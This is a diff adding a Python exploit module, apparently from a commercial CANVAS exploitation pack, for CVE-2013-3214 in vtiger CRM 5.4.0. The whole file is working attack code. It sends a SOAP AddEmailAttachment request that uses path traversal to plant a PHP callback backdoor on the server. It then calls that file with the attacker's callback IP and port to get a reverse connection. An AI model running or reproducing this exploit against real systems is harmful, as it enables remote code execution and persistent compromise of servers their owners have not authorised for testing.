@@ -1,0 +1,146 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2014
+#
+
+import sys
+import time
+import os
+import random
+import base64
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "vtiger CRM 5.4.0 File Upload Vulnerability"
+
+DESCRIPTION = "File upload vulnerability in vtiger CRM 5.4.0 SOAP AddEmailAttachment service"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "vtiger"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "vtiger CRM <= 5.4.0"
+DOCUMENTATION["Date public"] = "2013.08.01"
+DOCUMENTATION["References"] = "http://karmainsecurity.com/KIS-2013-07"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2013-3214"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3214"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the PHP node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = "backdoors/php_callback.php"
+    self.basepath = "/"    
+    self.protocol = "http"
+    self.port = 80
+    self.sslport = 443
+    self.https = 1
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.PHPMULTI]
+	
+  def upload_file(self):                   
+    f = open(self.filename, "r")
+    fdata = f.read()
+    f.close()     
+
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+ 
+    # Upload PHP file                  
+    url = '/vtigercrm540/soap/vtigerolservice.php'        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")   
+    ua.addHeader("Content-Type", "text/xml;charset=UTF-8")
+    payload = base64.b64encode(fdata)    
+    data = '<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:crm="http://www.vtiger.com/products/crm">\n'
+    data += '<soapenv:Header/>\n'
+    data += '<soapenv:Body>\n'    
+    data += '  <crm:AddEmailAttachment soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\n'
+    data += '    <emailid xsi:type="xsd:string">1234</emailid>\n'
+    data += '    <filedata xsi:type="xsd:string">%s</filedata>\n'%payload
+    data += '    <filename xsi:type="xsd:string">../../../../../../d2.php</filename>\n'
+    data += '    <filesize xsi:type="xsd:string">%d</filesize>\n'%len(payload)
+    data += '    <filetype xsi:type="xsd:string">php</filetype>\n'
+    data += '    <username xsi:type="xsd:string">d2</username>\n'
+    data += '    <session xsi:type="xsd:string"></session>\n'
+    data += '  </crm:AddEmailAttachment>\n'                                
+    data += '</soapenv:Body>\n'
+    data += '</soapenv:Envelope>\n'
+    
+    buff = ua.POST(mainurl, data)
+    	
+    # Execute uploaded PHP file
+    url = "/vtigercrm540/soap/d2.php?cb_ip=%s&cb_port=%s"%(self.callback.ip, self.callback.port)
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    buff = ua.GET(mainurl)    
+                		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))
+    self.basepath = self.argsDict.get("basepath", self.basepath)     
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
